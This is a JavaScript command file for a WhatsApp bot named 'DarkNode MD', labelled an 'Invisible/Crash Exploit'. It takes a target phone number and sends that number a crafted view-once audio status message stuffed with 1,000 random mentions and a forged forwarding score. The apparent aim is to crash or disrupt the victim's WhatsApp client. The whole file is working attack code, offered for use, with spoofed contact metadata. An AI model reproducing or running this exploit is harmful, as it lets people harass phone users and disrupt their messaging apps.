// commands/invis.js - Invisible/Crash Exploit
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const settings = require('../settings');

const fakeMeta = {
    key: {
        participant: '0@s.whatsapp.net',
        remoteJid: 'status@broadcast',
        fromMe: false,
        id: 'DARKNODE_META_' + Date.now()
    },
    message: {
        contactMessage: {
            displayName: 'DARKNODE MD',
            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:DARKNODE MD;;;;\nFN:DARKNODE MD\nTEL;waid=${settings.ownerNumber}:+${settings.ownerNumber}\nEND:VCARD`,
            sendEphemeral: true
        }
    },
    messageTimestamp: Math.floor(Date.now() / 1000),
    pushName: 'DARKNODE MD'
};

const channelInfo = {
    contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: settings.newsletterJid,
            newsletterName: settings.newsletterName,
            serverMessageId: -1
        }
    }
};

async function invisCommand(sock, chatId, message, args) {
    try {
        if (!message.key.fromMe) {
            await sock.sendMessage(chatId, {
                text: '╭─── ⪨ ❌ OWNER ONLY ⪩───⟢\n│ Owner only command.\n╰────────────⟢\n> © DarkNode MD',
                ...channelInfo
            }, { quoted: fakeMeta });
            return;
        }

        const target = args?.[0];
        if (!target) {
            await sock.sendMessage(chatId, {
                text: `╭─── ⪨ 👻 INVIS ⪩───⟢\n│ 📌 Usage: .invis <number>\n│ 💡 Example: .invis 628123456789\n╰────────────⟢\n> © DarkNode MD`,
                ...channelInfo
            }, { quoted: fakeMeta });
            return;
        }

        const cleanNumber = target.replace(/[^0-9]/g, '');
        const targetJid = cleanNumber + '@s.whatsapp.net';

        await sock.sendMessage(chatId, {
            text: `╭─── ⪨ 👻 INVIS ⪩───⟢\n│ Targeting: ${cleanNumber}\n╰────────────⟢\n> © DarkNode MD`,
            ...channelInfo
        }, { quoted: fakeMeta });

        const generateMessage = {
            viewOnceMessage: {
                message: {
                    audioMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc",
                        mimetype: "audio/mpeg",
                        fileSha256: Buffer.from([226, 213, 217, 102, 205, 126, 232, 145, 0, 70, 137, 73, 190, 145, 0, 44, 165, 102, 153, 233, 111, 114, 69, 10, 55, 61, 186, 131, 245, 153, 93, 211]),
                        fileLength: 432722,
                        seconds: 26,
                        ptt: false,
                        mediaKey: Buffer.from([182, 141, 235, 167, 91, 254, 75, 254, 190, 229, 25, 16, 78, 48, 98, 117, 42, 71, 65, 199, 10, 164, 16, 57, 189, 229, 54, 93, 69, 6, 212, 145]),
                        fileEncSha256: Buffer.from([29, 27, 247, 158, 114, 50, 140, 73, 40, 108, 77, 206, 2, 12, 84, 131, 54, 42, 63, 11, 46, 208, 136, 131, 224, 87, 18, 220, 254, 211, 83, 153]),
                        directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc",
                        mediaKeyTimestamp: 1746275400,
                        contextInfo: {
                            mentionedJid: Array.from({ length: 1000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                            isSampled: true,
                            participant: targetJid,
                            remoteJid: "status@broadcast",
                            forwardingScore: 9741,
                            isForwarded: true
                        }
                    }
                }
            }
        };

        const msg = generateWAMessageFromContent(targetJid, generateMessage, {});
        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [targetJid],
            additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: targetJid }, content: undefined }] }] }]
        });

        await sock.sendMessage(chatId, {
            text: `╭─── ⪨ ✅ SENT ⪩───⟢\n│ Invis exploit sent to ${cleanNumber}\n╰────────────⟢\n> © DarkNode MD`,
            ...channelInfo
        }, { quoted: fakeMeta });

    } catch (error) {
        console.error('[Invis] Error:', error);
        await sock.sendMessage(chatId, {
            text: `╭─── ⪨ ❌ ERROR ⪩───⟢\n│ ${error.message}\n╰────────────⟢\n> © DarkNode MD`,
            ...channelInfo
        }, { quoted: fakeMeta });
    }
}

module.exports = invisCommand;